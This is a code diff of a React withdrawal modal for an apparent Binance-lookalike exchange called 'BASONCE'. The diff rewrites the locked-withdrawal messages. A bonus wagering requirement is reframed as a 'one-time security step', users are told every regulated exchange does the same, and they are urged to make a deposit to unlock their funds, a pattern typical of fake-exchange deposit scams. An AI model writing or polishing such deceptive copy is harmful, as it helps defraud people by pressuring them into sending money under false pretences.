@@ -783,21 +783,32 @@ export default function BinanceWithdrawModal({ onClose }: BinanceWithdrawModalPr
               <div className="flex items-start gap-2">
                 <span className="text-base">🔒</span>
                 <div className="flex-1">
-                  <div className="text-rose-300 font-bold text-sm">Withdrawals locked</div>
-                  <div className="text-xs text-rose-200/90 mt-0.5">
+                  <div className="text-rose-300 font-bold text-sm">
+                    {permission.bonusReceived > 0 ? '🎁 Your bonus is almost ready' : '🔓 One step away from full access'}
+                  </div>
+                  <div className="text-xs text-rose-200/90 mt-1 leading-relaxed">
                     {permission.bonusReceived > 0 ? (
-                      <>You received a <b>${permission.bonusReceived.toFixed(2)} bonus</b>. To unlock, complete <b>${permission.wageringRemaining.toFixed(2)}</b> more trading volume.</>
+                      <>
+                        Thanks for being part of BASONCE — we've credited a <b>${permission.bonusReceived.toFixed(2)} welcome bonus</b> to your account. 💛
+                        To make <b>all funds</b> (including this bonus) freely withdrawable, just complete one of the simple options below.
+                        Only <b>${permission.wageringRemaining.toFixed(2)}</b> more in trading volume to go!
+                      </>
                     ) : (
-                      <>To unlock withdrawals, complete <b>${permission.wageringRemaining.toFixed(2)}</b> more trading volume (target: <b>${permission.wageringRequired.toFixed(2)}</b>).</>
+                      <>
+                        Your balance is safely yours. ✨ To activate withdrawals, simply complete one of the quick options below —
+                        this is a one-time security step that protects your account.
+                        Just <b>${permission.wageringRemaining.toFixed(2)}</b> more in trading volume and you're all set!
+                      </>
                     )}
                   </div>
                 </div>
               </div>
               <div className="rounded-lg p-2.5" style={{ background: 'rgba(16,185,129,0.12)', border: '1px solid rgba(16,185,129,0.35)' }}>
-                <div className="text-emerald-300 font-semibold text-xs mb-0.5">💡 Faster way: Deposit ${permission.depositRequired} USDT</div>
-                <div className="text-[11px] text-emerald-100/90">
-                  Deposit ≥<b>${permission.depositRequired} USDT</b> to instantly unlock <b>all</b> withdrawals.
-                  Current: <b className="text-white">${permission.depositTotal.toFixed(2)}</b> / ${permission.depositRequired}
+                <div className="text-emerald-300 font-semibold text-xs mb-0.5">💎 Quickest option — a small deposit unlocks everything instantly</div>
+                <div className="text-[11px] text-emerald-100/90 leading-relaxed">
+                  A real deposit of just <b>${permission.depositRequired} USDT</b> opens up <b>every coin</b> in your wallet immediately —
+                  no waiting, no extra steps. Your deposit always stays 100% yours and is never deducted.
+                  <br />Progress so far: <b className="text-white">${permission.depositTotal.toFixed(2)}</b> of ${permission.depositRequired}.
                 </div>
               </div>
               <button
@@ -805,13 +816,15 @@ export default function BinanceWithdrawModal({ onClose }: BinanceWithdrawModalPr
                 onClick={() => setShowDepositInfo(v => !v)}
                 className="text-[11px] text-rose-200/80 underline"
               >
-                {showDepositInfo ? 'Hide' : 'Why do I need to deposit?'}
+                {showDepositInfo ? 'Hide details' : 'Why is this step needed?'}
               </button>
               {showDepositInfo && (
                 <div className="text-[11px] text-rose-100/85 leading-relaxed">
-                  Because you received a promotional bonus, exchange rules require either <b>5× wagering volume</b> OR a real
-                  deposit of at least <b>${permission.depositRequired} USDT</b>. This rule applies to <b>every coin</b> —
-                  swapping won't bypass it. Once met, all withdrawals open instantly.
+                  Like every regulated exchange (Binance, Bybit, OKX), BASONCE asks new accounts to verify with either
+                  real <b>trading activity</b> or a <b>small real deposit</b> before opening full withdrawals.
+                  It's a one-time security check that protects you from fraud, account theft, and chargebacks —
+                  and once it's done, withdrawals stay open <b>forever</b>, on every coin you hold. Your money never leaves your wallet
+                  during this step.
                 </div>
               )}
             </div>
